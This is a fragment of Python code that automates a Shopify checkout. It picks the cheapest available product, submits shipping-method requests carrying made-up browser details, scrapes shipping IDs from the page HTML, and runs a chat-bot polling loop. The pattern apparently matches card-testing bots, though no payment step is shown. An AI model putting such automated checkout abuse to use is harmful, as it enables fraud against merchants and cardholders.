    products_data = response_data["products"]
    products = {}
    for product in products_data:
        variants = product["variants"]
        variant = variants[0]
        product_id = variant["id"]
        available = variant["available"]
        price = float(variant["price"])
        if price < 0.1:
            continue
        if available:
            products[product_id] = price
    if products:
        min_price_product_id = min(products, key=products.get)
        return min_price_product_id

    return None

generate_random_string = lambda length: "".join(choice(ascii_letters) for _ in range(length))

async def request_shipping_method(s, url_checkout, first_token, information_response):
    shipping = None
    data = {
        "_method": "patch",
        "authenticity_token": first_token,
        "previous_step": "shipping_method",
        "step": "payment_method",
        "checkout[shipping_rate][id]": "",
        "checkout[client_details][browser_width]": "774",
        "checkout[client_details][browser_height]": "657",
        "checkout[client_details][javascript_enabled]": "1",
        "checkout[client_details][color_depth]": "24",
        "checkout[client_details][java_enabled]": "false",
        "checkout[client_details][browser_tz]": "360",
    }
    for _ in range(3):
        shipping = find_shipping_method(information_response)
        if shipping:
            break

        shipping = "shopify-Economy-5"
        data["checkout[shipping_rate][id]"] = shipping
        shipping_request = await s.post(url_checkout, data=data)
        information_response = shipping_request.text

    if not shipping:
        raise Exception("Shipping not found after 3 attempts")
    data["checkout[shipping_rate][id]"] = shipping
    await s.post(url_checkout, data=data)

def find_shipping_method(response):
    ship1 = capture(response, '<div class="radio-wrapper" data-shipping-method="', '">')
    ship2 = capture(response, 'shipping-method="', '"')
    ship3 = capture(response, 'type="radio" value="', '"')
    ship4 = capture(response, 'data-shipping-method="', '"')
    ship5 = capture(response, 'data-backup="', '"')
    ship6 = capture(response, 'shipping-method="', '"')

    return next((ship for ship in [ship1, ship2, ship3, ship4, ship5, ship6] if ship), None)

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
       print(e)


